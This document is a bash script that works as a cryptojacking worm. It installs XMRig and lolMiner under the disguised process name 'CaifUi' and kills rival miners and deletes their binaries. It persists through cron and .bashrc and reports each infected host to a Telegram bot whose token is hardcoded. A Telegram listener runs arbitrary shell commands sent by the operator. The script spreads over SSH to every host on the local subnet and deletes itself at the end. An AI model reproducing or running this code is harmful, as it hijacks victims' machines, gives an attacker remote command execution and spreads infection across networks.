#!/bin/bash

KRIPTEX_USERNAME="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"

ETC_POOLS=(
  "etc.kryptex.network:7033"
  "etc-us.kryptex.network:7033"
  "etc-eu.kryptex.network:7033"
  "etc-sg.kryptex.network:7033"
  "etc-ru.kryptex.network:7033"
)
XMR_POOLS=(
  "xmr.kryptex.network:7029"
  "xmr-eu.kryptex.network:7029"
  "xmr-us.kryptex.network:7029"
  "xmr-sg.kryptex.network:7029"
  "xmr-ru.kryptex.network:7029"
)
LOGFILE="$HOME/mining_control.log"
ANTISPAM_FILE="/tmp/miner_antispam_$(id -u)"
INFECTED_MARKER="/tmp/.already_infected_$(echo $KRIPTEX_USERNAME | md5sum | cut -d' ' -f1)"
LOG_TAIL=50
LOG_ROTATE_MAX=10485760
LOG_ROTATE_LINES=5000
WATCHDOG_INTERVAL=60
WATCHDOG_TIMEOUT=300
PERIODIC_REPORT_INTERVAL=21600
SSH_COMMON_PASSWORDS=("root" "admin" "password" "123456" "toor" "changeme" "P@ssw0rd")

if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
    MINING_PATH="/opt/mining"
    LOG_PATH="/var/log"
else
    IS_ROOT=false
    MINING_PATH="$HOME/opt/mining"
    LOG_PATH="/tmp"
fi

get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
}

SERVER_IP=$(get_server_ip)
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"

download_file() {
    local url="$1"
    local out="$2"
    if command -v wget &>/dev/null; then
        wget -q "$url" -O "$out"
    elif command -v curl &>/dev/null; then
        curl -L -s "$url" -o "$out"
    else
        echo "nety wget ili curl, ne mogu skachat $url" | tee -a "$LOGFILE"
        return 1
    fi
}

log_event() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $*" >> "$LOGFILE"
}

send_telegram_message() {
    local message="$1"
    command -v curl &>/dev/null || return
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" >/dev/null 2>&1
    log_event "telegram message: ${message:0:100}..."
}

find_working_pool() {
    local result
    for pool in "$@"; do
        host=$(echo "$pool" | awk -F: '{print $1}')
        port=$(echo "$pool" | awk -F: '{print $2}')
        if command -v nc &>/dev/null && nc -z -w 2 "$host" "$port" 2>/dev/null; then
            result="$pool"
            break
        fi
    done
    if [ -z "$result" ]; then
        result="$1"
    fi
    echo "$result"
}

cleanup_miner_processes() {
    echo "chistka konkurentov majninga..." | tee -a "$LOGFILE"
    local patterns="miner|xmrig|lolMiner|crypto|eth|xmr"
    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|$$"
    local cleared=0
    if $IS_ROOT; then
        ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
            pid=$(echo "$line" | awk '{print $2}')
            pname=$(echo "$line" | awk '{print $11}')
            if [[ "$pid" == "$$" ]] || echo "$pname" | grep -Eiq "$whitelist"; then
                continue
            fi
            if pgrep -f "CaifUi" | grep -q "^$pid$" 2>/dev/null; then
                cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
                if echo "$cmdline" | grep -q "$KRIPTEX_USERNAME"; then
                    continue
                fi
            fi
            exe="/proc/$pid/exe"
            if [ -L "$exe" ]; then
                real_bin=$(readlink -f "$exe" 2>/dev/null)
                if [[ -f "$real_bin" && ! "$real_bin" =~ "$MINING_PATH" ]]; then
                    rm -f "$real_bin" 2>/dev/null && log_event "udalil binarnik $real_bin"
                fi
            fi
            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid ($pname)" && cleared=$((cleared+1))
        done
    else
        ps -u $USER -o pid,comm | grep -Ei "$patterns" | while read -r pid pname; do
            [[ "$pid" == "$$" ]] && continue
            echo "$pname" | grep -Eiq "$whitelist" && continue
            exe="/proc/$pid/exe"
            if [ -L "$exe" ]; then
                bin=$(readlink -f "$exe" 2>/dev/null)
                [[ -f "$bin" && ! "$bin" =~ "$MINING_PATH" ]] && rm -f "$bin" 2>/dev/null && log_event "udalil binarnik $bin"
            fi
            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid ($pname)" && cleared=$((cleared+1))
        done
    fi
    if command -v nvidia-smi >/dev/null 2>&1; then
        nvidia-smi pmon -c 1 2>/dev/null | awk 'NR>1 {print $2}' | grep -E '[0-9]+' | while read -r npid; do
            cmdline=$(cat /proc/$npid/cmdline 2>/dev/null | tr '\0' ' ')
            if echo "$cmdline" | grep -q "$KRIPTEX_USERNAME"; then
                continue
            fi
            exe="/proc/$npid/exe"
            if [ -L "$exe" ]; then
                nbin=$(readlink -f "$exe" 2>/dev/null)
                [[ -f "$nbin" && ! "$nbin" =~ "$MINING_PATH" ]] && rm -f "$nbin" 2>/dev/null && log_event "(nvidia) udalil binarnik $nbin"
            fi
            kill -9 "$npid" 2>/dev/null && log_event "(nvidia) ubil process $npid" && cleared=$((cleared+1))
        done
    fi
    log_event "ochishcheno processov: $cleared"
}

install_dependencies() {
    echo "proverka i ustanovka zavisimostey..." | tee -a "$LOGFILE"
    local warn_list=""
    if $IS_ROOT; then
        for pkg in curl cron jq nc sshpass; do
            if ! command -v "$pkg" &>/dev/null; then
                apt-get update -qq >/dev/null 2>&1 && apt-get install -y "$pkg" >/dev/null 2>&1 || \
                yum install -y "$pkg" >/dev/null 2>&1 || \
                apk add "$pkg" >/dev/null 2>&1
            fi
            if ! command -v "$pkg" &>/dev/null; then
                log_event "net $pkg, ne ustanovilos"
                warn_list="$warn_list $pkg"
            fi
        done
    else
        for pkg in curl jq nc; do
            if ! command -v "$pkg" &>/dev/null; then
                log_event "net $pkg, ustanovi v rucnuyu"
                warn_list="$warn_list $pkg"
            fi
        done
    fi
    if [[ -n "$warn_list" ]]; then
        send_telegram_message "⚠️ Ne hvataet zavisimostey:$warn_list"
        echo "Net chastichnyh zavisimostey:$warn_list" | tee -a "$LOGFILE"
    fi
    log_event "proverka zavisimostey zavershena"
}

install_etc_miner() {
    log_event "ustanovka ETC-majnera..."
    mkdir -p "${MINING_PATH}/etc"
    cd "${MINING_PATH}/etc" || return 1
    download_file "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" "lolMiner_v1.98_Lin64.tar.gz" || return 1
    tar -xzf lolMiner_v1.98_Lin64.tar.gz --strip-components=1 || return 1
    rm -f lolMiner_v1.98_Lin64.tar.gz
    [[ -x ./lolMiner ]] || { log_event "lolMiner not found after install!"; return 1; }
    ETC_POOL_SELECTED=$(find_working_pool "${ETC_POOLS[@]}")
    cat > "${MINING_PATH}/etc/start_etc_miner.sh" <<EOF
#!/bin/bash
cd "${MINING_PATH}/etc"
SERVER_IP_DYNAMIC=\$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print \$1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID_DYNAMIC=\$(echo "\$SERVER_IP_DYNAMIC" | tr -d '.')
exec -a CaifUi ./lolMiner --algo ETCHASH --pool $ETC_POOL_SELECTED --user ${KRIPTEX_USERNAME}.\${WORKER_ID_DYNAMIC} --tls off --nocolor
EOF
    chmod +x "${MINING_PATH}/etc/start_etc_miner.sh"
    chmod +x "${MINING_PATH}/etc/lolMiner"
    log_event "ETC miner ustanovlen (pool: $ETC_POOL_SELECTED)"
}

install_xmr_miner() {
    log_event "ustanovka XMRig..."
    mkdir -p "${MINING_PATH}/xmr"
    cd "${MINING_PATH}/xmr" || return 1
    download_file "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" "xmrig-6.18.0-linux-x64.tar.gz" || return 1
    tar -xzf xmrig-*-linux-x64.tar.gz --strip-components=1 || return 1
    rm -f xmrig-*-linux-x64.tar.gz
    [[ -x ./xmrig ]] || { log_event "xmrig not found after install!"; return 1; }
    XMR_POOL_SELECTED=$(find_working_pool "${XMR_POOLS[@]}")
    cat > "${MINING_PATH}/xmr/start_xmr_miner.sh" <<EOF
#!/bin/bash
cd "${MINING_PATH}/xmr"
SERVER_IP_DYNAMIC=\$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print \$1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID_DYNAMIC=\$(echo "\$SERVER_IP_DYNAMIC" | tr -d '.')
exec -a CaifUi ./xmrig -o $XMR_POOL_SELECTED -u ${KRIPTEX_USERNAME}.\${WORKER_ID_DYNAMIC} -p x --randomx-1gb-pages
EOF
    chmod +x "${MINING_PATH}/xmr/start_xmr_miner.sh"
    chmod +x "${MINING_PATH}/xmr/xmrig"
    log_event "XMRig ustanovlen (pool: $XMR_POOL_SELECTED)"
}

setup_autostart() {
    log_event "nastroyka avtozapuska..."
    if $IS_ROOT; then
        (crontab -l 2>/dev/null | grep -v "${MINING_PATH}/etc/start_etc_miner.sh\|${MINING_PATH}/xmr/start_xmr_miner.sh"; \
         echo "@reboot ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log &"; \
         echo "@reboot ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &") | crontab -
    fi
    (crontab -l 2>/dev/null | grep -v "${MINING_PATH}/etc/start_etc_miner.sh\|${MINING_PATH}/xmr/start_xmr_miner.sh"; \
     echo "@reboot ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log &"; \
     echo "@reboot ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &") | crontab -
    grep -q "start_etc_miner.sh" "$HOME/.bashrc" 2>/dev/null || echo "[ ! -f /tmp/.mining_started ] && ${MINING_PATH}/etc/start_etc_miner.sh &> ${LOG_PATH}/etc-miner.log & && touch /tmp/.mining_started" >> "$HOME/.bashrc"
    grep -q "start_xmr_miner.sh" "$HOME/.bashrc" 2>/dev/null || echo "[ ! -f /tmp/.mining_started ] && ${MINING_PATH}/xmr/start_xmr_miner.sh &> ${LOG_PATH}/xmr-miner.log &" >> "$HOME/.bashrc"
    log_event "avtozapusk nastroen"
}

antispam() {
    local now=$(date +%s)
    if [ -f "$ANTISPAM_FILE" ]; then
        local last=$(cat "$ANTISPAM_FILE")
        ((now - last < 5)) && return 1
    fi
    echo "$now" > "$ANTISPAM_FILE"
    return 0
}

rotate_log() {
    if [ -f "$LOGFILE" ]; then
        local size=$(stat -c%s "$LOGFILE" 2>/dev/null || echo 0)
        if (( size > LOG_ROTATE_MAX )); then
            tail -n $LOG_ROTATE_LINES "$LOGFILE" > "${LOGFILE}.tmp"
            mv "${LOGFILE}.tmp" "$LOGFILE"
            log_event "LOG ROTATED"
        fi
    fi
}

watchdog() {
    while true; do
        sleep $WATCHDOG_INTERVAL
        if [ -f "${LOG_PATH}/etc-miner.log" ]; then
            local last_etc=$(stat -c %Y "${LOG_PATH}/etc-miner.log" 2>/dev/null || echo 0)
            local now=$(date +%s)
            if (( now - last_etc > WATCHDOG_TIMEOUT )); then
                log_event "WATCHDOG: ETC zavis, perezapusk"
                pkill -9 -f "CaifUi.*lolMiner"
                sleep 2
                "${MINING_PATH}/etc/start_etc_miner.sh" &> "${LOG_PATH}/etc-miner.log" &
                send_telegram_message "⚠️ WATCHDOG: ETC perezapushchen (zavis)"
            fi
        fi
        if [ -f "${LOG_PATH}/xmr-miner.log" ]; then
            local last_xmr=$(stat -c %Y "${LOG_PATH}/xmr-miner.log" 2>/dev/null || echo 0)
            local now=$(date +%s)
            if (( now - last_xmr > WATCHDOG_TIMEOUT )); then
                log_event "WATCHDOG: XMR zavis, perezapusk"
                pkill -9 -f "CaifUi.*xmrig"
                sleep 2
                "${MINING_PATH}/xmr/start_xmr_miner.sh" &> "${LOG_PATH}/xmr-miner.log" &
                send_telegram_message "⚠️ WATCHDOG: XMR perezapushchen (zavis)"
            fi
        fi
    done
}

periodic_report() {
    while true; do
        sleep $PERIODIC_REPORT_INTERVAL
        local uptimes=$(ps -eo etime,comm 2>/dev/null | grep CaifUi | awk '{print $1}' | head -2 | tr '\n' ' ')
        local etc_hash=$(tail -20 "${LOG_PATH}/etc-miner.log" 2>/dev/null | grep -o "Average speed.*" | tail -1 | awk '{print $3" "$4}')
        local xmr_hash=$(tail -20 "${LOG_PATH}/xmr-miner.log" 2>/dev/null | grep -o "speed [0-9.]*" | tail -1 | awk '{print $2" H/s"}')
        send_telegram_message "📊 Auto-report
Host: $(hostname)
IP: $(get_server_ip)
Worker: $WORKER_NAME
Uptime: $uptimes
ETC: ${etc_hash:-N/A}
XMR: ${xmr_hash:-N/A}"
        log_event "PERIODIC REPORT sent"
    done
}

telegram_listener() {
    local offset=0
    while true; do
        local updates=$(curl -s "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=$offset&timeout=30" 2>/dev/null)
        if [[ -z "$updates" ]]; then sleep 5; continue; fi
        echo "$updates" | jq -c '.result[]? | select(.message.text and .message.from.id) | {update_id: .update_id, text: .message.text, id: .message.from.id}' 2>/dev/null | while read -r line; do
            local msg=$(echo "$line" | jq -r '.text' 2>/dev/null)
            local uid=$(echo "$line" | jq -r '.id' 2>/dev/null)
            local upd_id=$(echo "$line" | jq -r '.update_id' 2>/dev/null)
            [[ -n "$upd_id" ]] && offset=$((upd_id + 1))
            [[ "$uid" != "$TELEGRAM_CHAT_ID" ]] && continue
            antispam || { send_telegram_message "Zhdi! Ne chashche raza v 5 sekund."; continue; }
            log_event "Komanda admina: $msg"
            case "$msg" in
                "/status $WORKER_NAME")
                    local uptimes=$(ps -eo etime,comm 2>/dev/null | grep CaifUi | awk '{print $1}' | tr '\n' ' ')
                    local etc_log=$(tail -5 "${LOG_PATH}/etc-miner.log" 2>/dev/null | tail -3)
                    local xmr_log=$(tail -5 "${LOG_PATH}/xmr-miner.log" 2>/dev/null | tail -3)
                    send_telegram_message "Status: $(uptime)
UPTIME: $uptimes
ETC: $etc_log
XMR: $xmr_log"
                    ;;
                "/restart $WORKER_NAME")
                    pkill -9 -f CaifUi
                    sleep 2
                    "${MINING_PATH}/etc/start_etc_miner.sh" &> "${LOG_PATH}/etc-miner.log" &
                    "${MINING_PATH}/xmr/start_xmr_miner.sh" &> "${LOG_PATH}/xmr-miner.log" &
                    send_telegram_message "Maynery perezapushcheny!"
                    ;;
                "/stop $WORKER_NAME")
                    pkill -9 -f CaifUi
                    send_telegram_message "Maynery ostanovleny!"
                    ;;
                "/log $WORKER_NAME")
                    rotate_log
                    if [ -f "$LOGFILE" ]; then
                        send_telegram_message "Log:\n$(tail -n $LOG_TAIL "$LOGFILE")"
                    else
                        send_telegram_message "Log pust"
                    fi
                    ;;
                "/update $WORKER_NAME")
                    send_telegram_message "Nachalo obnovleniya..."
                    pkill -9 -f CaifUi
                    sleep 2
                    $IS_ROOT && chattr -i "${MINING_PATH}/etc/lolMiner" "${MINING_PATH}/xmr/xmrig" 2>/dev/null
                    rm -rf "${MINING_PATH}/etc" "${MINING_PATH}/xmr"
                    if install_etc_miner && install_xmr_miner; then
                        setup_autostart
                        "${MINING_PATH}/etc/start_etc_miner.sh" &> "${LOG_PATH}/etc-miner.log" &
                        "${MINING_PATH}/xmr/start_xmr_miner.sh" &> "${LOG_PATH}/xmr-miner.log" &
                        send_telegram_message "✅ Maynery obnovleny i zapushcheny"
                    else
                        send_telegram_message "❌ Oshibka obnovleniya"
                    fi
                    ;;
                /bash\ $WORKER_NAME*)
                    local bashcmd="${msg#"/bash $WORKER_NAME "}"
                    local out=$(bash -c "$bashcmd" 2>&1 | head -50)
                    send_telegram_message "$out"
                    ;;
            esac
        done
        sleep 5
    done
}

deploy_to_local_network() {
    [ -f "$INFECTED_MARKER" ] && return
    touch "$INFECTED_MARKER"
    log_event "Nachalo deploy v lokalnuyu set'..."
    local my_ip=$(hostname -I | awk '{print $1}')
    local net_base=$(echo $my_ip | awk -F. '{print $1"."$2"."$3"."}')
    for i in $(seq 1 254); do
        (
            local target_ip="$net_base$i"
            [[ "$target_ip" == "$my_ip" ]] && return
            nc -z -w 1 $target_ip 22 2>/dev/null || return
            log_event "Nayshden SSH: $target_ip"
            if scp -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$0" "root@$target_ip:/tmp/minerpush.sh" 2>/dev/null; then
                ssh -o StrictHostKeyChecking=no root@$target_ip "bash /tmp/minerpush.sh &" 2>/dev/null && \
                log_event "Uspeshno zarazil $target_ip (SSH keys)" && \
                send_telegram_message "✅ Zarazil $target_ip (SSH keys)" && \
                return
            fi
        ) &
    done
    wait
}

main() {
    echo "start osnovnogo processa"
    send_telegram_message "nachato ustanovka majnerov
User: $(whoami)
Host: $(hostname)
IP: $(hostname -I)
Worker: ${WORKER_NAME}
Time: $(date '+%Y-%m-%d %H:%M:%S')"
    install_dependencies
    cleanup_miner_processes
    install_etc_miner && echo "ETC miner ustanovlen" || send_telegram_message "oshibka ustanovki ETC"
    install_xmr_miner && echo "XMRig ustanovlen" || send_telegram_message "oshibka ustanovki XMR"
    setup_autostart
    echo "zapusk majnerov"
    "${MINING_PATH}/etc/start_etc_miner.sh" &> "${LOG_PATH}/etc-miner.log" &
    "${MINING_PATH}/xmr/start_xmr_miner.sh" &> "${LOG_PATH}/xmr-miner.log" &
    send_telegram_message "ustanovka zavershena
User: $(whoami)
Host: $(hostname)
IP: $(hostname -I)
Worker: ${WORKER_NAME}
Time: $(date '+%Y-%m-%d %H:%M:%S')"
    ( telegram_listener || echo "telegram_listener not started" ) &
    ( watchdog || echo "watchdog not started" ) &
    ( periodic_report || echo "periodic_report not started" ) &
    sleep 2
    deploy_to_local_network
    if [ -w "$0" ]; then rm -f -- "$0"; fi
}
main
